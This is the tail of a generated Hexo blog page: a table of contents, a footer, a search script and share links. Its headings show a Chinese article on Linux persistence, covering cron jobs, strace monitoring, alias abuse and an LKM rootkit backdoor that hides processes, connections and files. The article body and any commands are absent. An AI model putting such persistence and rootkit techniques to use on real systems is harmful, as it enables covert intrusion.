href="#1%E3%80%81%E7%AE%80%E5%8D%95%E7%89%88"><span class="toc-text">1、简单版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%8D%87%E7%BA%A7%E7%89%88"><span class="toc-text">2、升级版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%8C%81%E4%B9%85%E5%8C%96-%E9%9A%90%E8%97%8F"><span class="toc-text">3、持久化+隐藏</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDLKM-Rootkit%E5%90%8E%E9%97%A8"><span class="toc-text">内核加载LKM-Rootkit后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E6%90%AD%E5%BB%BA"><span class="toc-text">自动化脚本搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Centos"><span class="toc-text">Centos</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ubuntu"><span class="toc-text">ubuntu</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-text">使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B"><span class="toc-text">隐藏进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E8%BF%9E%E6%8E%A5"><span class="toc-text">隐藏连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-text">隐藏文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BD%BF%E7%94%A8"><span class="toc-text">客户端使用</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)-Cron%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%26Strace%E7%9B%91%E6%8E%A7%26Alias%E5%88%AB%E5%90%8D%26Rootkit%E5%90%8E%E9%97%A8 + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2F1e8c3e31%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/1e8c3e31/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
